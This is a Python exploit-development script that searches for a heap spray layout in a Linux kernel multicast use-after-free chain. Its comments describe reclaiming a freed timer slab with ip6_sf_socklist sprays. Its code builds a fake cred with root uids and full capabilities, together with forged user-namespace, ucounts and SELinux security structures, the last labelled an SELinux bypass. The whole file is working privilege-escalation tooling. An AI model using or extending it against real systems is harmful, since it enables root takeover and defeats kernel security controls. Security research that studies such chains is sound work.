# lay9.py -- search a *uniform* psl payload pattern for the mcast post-leak
# chain.
#
# Model
# -----
# The stale cpu_timer node X lives in a 0x108-stride timer slab that the
# mcast spray retook as a kmalloc-256 order-1 slab: 32 objects, stride 0x100,
# slab base = O & ~0x1fff.  Every object is a struct ip6_sf_socklist:
#   sl_max@0x00  sl_count@0x04  rcu@0x08   sl_addr[14] @ [0x18,0xf8)
# Only [0x18,0xf8) is user controlled (14 x 16 sockaddr bytes) and readable
# back through MCAST_MSFILTER.  The spray gives *every* psl the same 14
# sources, so the slab content is periodic with period 0x100, except the
# 0x18-byte per-object header (sl_max=sl_count=14, rcu uninitialised).
#
# The fake cred C and the fake user_namespace U / ucounts / user_struct /
# group_info / task_security_struct therefore alias: two fields whose
# offsets differ by a multiple of 0x100 land on the same pattern byte.  The
# point of this script is to find phases (object address mod 0x100) and block
# indices such that every *used* field byte agrees with every other field
# byte it aliases, and lands in the writable window.
#
# Field values follow the QEMU-validated AIO layout (ic_peak_fill_cred):
#   cred: self pointer @0, euid/fsuid = 0/0xffffffff (the pair doubles as the
#         collect's iteration-2 expires), cap_permitted/effective/bset=~0,
#         ambient/inheritable/keyrings/rcu=0, five pointers @0x78..0xa0.
#   user_namespace: uid_map nr_extents@0=1, extent[0]={first@8=0,
#         lower_first@0xc=0, count@0x10}, gid_map@0x48 likewise, ns.count
#         @0x104=0x40000000, ucounts@0x210, rlimit_max[0]@0x268=LONG_MAX.
#         count@0x10 aliases ucounts@0x210: the same 8 bytes must be both a
#         valid ucounts pointer P and an extent count.  That works because
#         map_id_up() only needs first=0 and count != 0, so count := low32(P).
#   ucounts P (reached through U->ucounts): ns@0x10 -> Q, rlimit[0]@0x70
#         incremented by the fork path.
#   ns Q (walk terminator, never used as cred->user_ns): ucounts@0x210=0,
#         rlimit_max[0]@0x268=LONG_MAX.
#   user_struct: __count@0 = 0x40000000.  group_info: usage@0, ngroups@4.
#   task_security_struct: osid@0=1, sid@4 (SELinux bypass; 1 = kernel sid or
#         the per-target override).
#
# Usage: python -I lay9.py [base_hex] [O_block]

import random
import sys

WLO, WHI = 0x18, 0xf8          # writable residues inside one 0x100 object
NLONG = 0x7fffffffffffffff

# (offset, size, value)
# value: int literal, object name (-> its address), 'self', 'sid',
#        'count' (low32 of P), 'hi32:cred'
CRED = [
    (0x00, 8, 'self'),
    (0x08, 8, None),                 # gid|suid: erased with the cred marker
    (0x10, 4, None),                 # sgid: unused
    (0x14, 4, 0),                    # euid
    (0x18, 4, 0),                    # egid
    (0x1c, 4, 0xffffffff),           # fsuid; with egid = iteration-2 expires
    (0x20, 8, 0),                    # fsgid|securebits
    (0x28, 8, 0),                    # cap_inheritable
    (0x30, 8, 0xffffffffffffffff),   # cap_permitted
    (0x38, 8, 0xffffffffffffffff),   # cap_effective
    (0x40, 8, 0xffffffffffffffff),   # cap_bset
    (0x48, 8, 0),                    # cap_ambient
    (0x50, 0x28, 0),                 # keyrings (put_cred_rcu key_put)
    (0x78, 8, 'sec'),
    (0x80, 8, 'user'),
    (0x88, 8, 'ns'),
    (0x90, 8, 'ucounts'),
    (0x98, 8, 'gi'),
    (0xa0, 0x10, 0),                 # rcu_head
]
NS = [
    (0x00, 4, 1),                    # uid_map.nr_extents
    (0x08, 4, 0),                    # extent[0].first
    (0x0c, 4, 0),                    # extent[0].lower_first
    (0x10, 4, 'count'),              # extent[0].count == low32(P)
    (0x48, 4, 1),                    # gid_map.nr_extents
    (0x58, 4, 1),                    # gid extent count
    (0xd8, 8, None),                 # parent (unreachable)
    (0xe0, 4, None),                 # level  (unreachable)
    (0x104, 4, 0x40000000),          # ns.count
    (0x210, 8, 'P'),                 # ucounts; aliases offset 0x10
    (0x268, 8, NLONG),               # rlimit_max[0]
]
UC = [
    (0x10, 8, 'ns'),
    (0x18, 4, 'hi32:cred'),
    (0x1c, 4, 0x40000000),
    (0x70, 8, 0),                    # rlimit[UCOUNT_RLIMIT_NPROC]
]
UP = [
    (0x10, 8, 'Q'),
    (0x70, 8, 0),
]
UQ = [
    (0x210, 8, 0),
    (0x268, 8, NLONG),
]
USER = [(0x00, 4, 0x40000000)]
GI = [(0x00, 4, 0x40000000), (0x04, 4, 0)]
SEC = [(0x00, 4, 1), (0x04, 4, 'sid')]
OBJS = {'cred': CRED, 'ns': NS, 'ucounts': UC, 'P': UP, 'Q': UQ,
        'user': USER, 'gi': GI, 'sec': SEC}
ORDER = ['Q', 'P', 'ns', 'ucounts', 'user', 'gi', 'sec']


class Layout:
    def __init__(self, base, sid):
        self.base = base
        self.sid = sid
        self.mem = {}          # residue -> (byte, reason)
        self.addr = {}         # obj -> absolute address

    def resolve(self, spec, owner):
        if isinstance(spec, int):
            return spec
        if spec == 'self':
            return self.addr[owner]
        if spec == 'sid':
            return self.sid
        if spec == 'count':
            return self.addr['P'] & 0xffffffff
        if spec.startswith('hi32:'):
            return (self.addr[spec[5:]] >> 32) & 0xffffffff
        return self.addr[spec]

    def used_blocks(self, obj, addr):
        out = set()
        for (off, size, spec) in OBJS[obj]:
            if spec is None:
                continue
            for i in range(size):
                out.add(((addr + off + i) - self.base) >> 8)
        return out

    def place(self, obj, addr, forbidden=()):
        if addr & 7:
            return None
        if addr < self.base or addr + 0x300 > self.base + 0x2000:
            return None
        if self.used_blocks(obj, addr) & set(forbidden):
            return None
        trial = {}
        for (off, size, spec) in OBJS[obj]:
            if spec is None:
                continue
            val = self.resolve(spec, obj)
            for i in range(size):
                a = addr + off + i
                r = a & 0xff
                if r < WLO or r >= WHI:
                    return None           # used byte in the header hole
                b = (val >> (8 * i)) & 0xff
                if r in trial and trial[r] != b:
                    return None
                if r in self.mem and self.mem[r][0] != b:
                    return None
                if r in trial and trial[r] != b:
                    return None
                trial[r] = b
        # commit
        for (off, size, spec) in OBJS[obj]:
            if spec is None:
                continue
            val = self.resolve(spec, obj)
            for i in range(size):
                r = (addr + off + i) & 0xff
                self.mem[r] = ((val >> (8 * i)) & 0xff,
                               '%s+%#x[%d]' % (obj, off, i))
        self.addr[obj] = addr
        return True

    def read64(self, addr):
        v = 0
        for i in range(8):
            r = (addr + i) & 0xff
            if r not in self.mem:
                return None
            v |= self.mem[r][0] << (8 * i)
        return v

    def check_chain(self):
        C = self.addr['cred']
        out = []
        out.append(('self-ptr', self.read64(C) == C))
        out.append(('erase-dir', ((C >> 32) & 0xffffffff) != 0))
        out.append(('expires', self.read64(C + 0x18) == 0xffffffff00000000))
        P = self.addr['P']
        out.append(('P-aligned', (P & 7) == 0))
        out.append(('count-nz', (P & 0xffffffff) != 0))
        return out


def search(base, oi, sid=1, attempts=4000, seed=1):
    rnd = random.Random(seed)
    phases = list(range(WLO, 0xf0, 8))
    forbidden = (oi, oi + 1)

    for attempt in range(attempts):
        cred_block = rnd.choice([b for b in range(32)
                                 if b not in forbidden and b != 30 and b != 31])
        cred_phase = rnd.choice(list(range(WLO, 0x49, 8)))
        C = base + 0x100 * cred_block + cred_phase
        lay = Layout(base, sid)
        lay.addr['cred'] = C
        ok = True
        for obj in ORDER:
            cands = [(base + 0x100 * b + p) for b in range(32) for p in phases]
            rnd.shuffle(cands)
            done = False
            for a in cands:
                if lay.place(obj, a, forbidden):
                    done = True
                    break
            if not done:
                ok = False
                break
        if not ok:
            continue
        if not lay.place('cred', C, forbidden):
            continue
        chk = lay.check_chain()
        if all(v for _, v in chk):
            return lay, chk, attempt
    return None, None, -1


def dump(lay, chk):
    print('base=%#x  sid=%#x' % (lay.base, lay.sid))
    for obj in ['cred'] + ORDER:
        a = lay.addr[obj]
        print('  %-8s %#018x  block %2d phase %#04x' %
              (obj, a, ((a - lay.base) >> 8), a & 0xff))
    print('checks:', ', '.join('%s=%s' % (k, v) for k, v in chk))
    print('\npattern (## header/tail, .. free):')
    for r in range(0, 0x100, 16):
        row = []
        for i in range(16):
            rr = r + i
            if rr in lay.mem:
                row.append('%02x' % lay.mem[rr][0])
            elif WLO <= rr < WHI:
                row.append('..')
            else:
                row.append('##')
        print('  %02x: %s' % (r, ' '.join(row)))


def main():
    base = 0xffffff80036d2000
    oi = 11
    if len(sys.argv) > 1:
        base = int(sys.argv[1], 0)
    if len(sys.argv) > 2:
        oi = int(sys.argv[2], 0)
    lay, chk, att = search(base, oi)
    if lay is None:
        print('NO LAYOUT for base %#x oi=%d' % (base, oi))
        return 1
    print('found after %d attempts' % att)
    dump(lay, chk)
    return 0


if __name__ == '__main__':
    sys.exit(main())
